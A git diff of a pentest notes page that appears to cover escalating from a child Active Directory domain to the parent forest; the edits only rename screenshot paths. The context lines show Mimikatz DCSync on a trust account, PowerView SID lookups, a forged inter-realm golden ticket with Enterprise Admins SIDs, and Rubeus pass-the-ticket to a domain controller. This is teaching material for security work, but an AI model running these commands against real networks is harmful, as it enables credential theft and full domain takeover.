@@ -30,7 +30,7 @@ The attack is executed from the perspective of already gaining domain admin priv
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:amsterdam\bank$"'
 ```
 
-![](<../../../.gitbook/assets/image (9) (1).png>)
+![](<../../../.gitbook/assets/image (9) (1) (2).png>)
 
 4\. Retrieve the SID of the enterprise Admins group, using PowerView:
 
@@ -46,7 +46,7 @@ Get-DomainGroup "Enterprise Admins" -Domain bank.local | Select-Object samaccoun
 Get-DomainSid
 ```
 
-![](<../../../.gitbook/assets/image (64) (1).png>)
+![](<../../../.gitbook/assets/image (64) (1) (2).png>)
 
 6\. Create a TGT for the krbtgt user and save it to disk with MimiKatz:
 
@@ -54,7 +54,7 @@ Get-DomainSid
 Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<SID CHILD DOMAIN> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /rc4:<TRUST KEY HASH> /service:krbtgt /target:<FQDN PARENT DOMAIN> /ticket:<PATH TO SAVE TICKET>"'
 ```
 
-![](<../../../.gitbook/assets/image (72).png>)
+![](<../../../.gitbook/assets/image (72) (2).png>)
 
 7\. Create a TGS for the CIFS service with Rubeus.exe using the created TGT:
 
@@ -62,11 +62,11 @@ Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<FQDN CH
 .\Rubeus.exe asktgs /ticket:trustkey.kirbi /service:CIFS/dc01.bank.local /dc:dc01.bank.local /ptt
 ```
 
-![](<../../../.gitbook/assets/image (28).png>)
+![](<../../../.gitbook/assets/image (28) (2).png>)
 
 List the tickets:
 
-![](<../../../.gitbook/assets/image (13).png>)
+![](<../../../.gitbook/assets/image (13) (2).png>)
 
 ## Defending
 
